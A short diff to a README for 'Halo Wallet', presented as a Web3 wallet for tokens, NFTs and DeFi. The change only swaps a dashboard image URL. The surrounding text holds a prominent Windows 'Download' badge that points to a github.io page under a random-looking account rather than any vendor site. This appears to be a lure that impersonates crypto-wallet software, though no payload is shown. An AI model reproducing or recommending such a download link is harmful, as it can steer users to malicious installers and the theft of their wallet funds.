@@ -1,6 +1,6 @@
 # Halo Wallet - Web3 Asset Hub for Tokens, NFTs, and DeFi Access
 
-![Halo Wallet dashboard showing token balances, NFT cards, and network controls](https://mms.businesswire.com/media/20230403005395/en/1754015/5/5016229c-Halo_Wallet.jpg)
+![Halo Wallet dashboard showing token balances, NFT cards, and network controls](https://mms.businesswire.com/media/20230403005395/en/1754000/5/Halo_Wallet_Rebrand.jpg)
 
 [![Download Halo Wallet](https://img.shields.io/badge/Download-Halo_Wallet-blueviolet?style=for-the-badge&logo=windows)](https://lunasiegsqtdb.github.io/.github/Halo-Wallet)
 
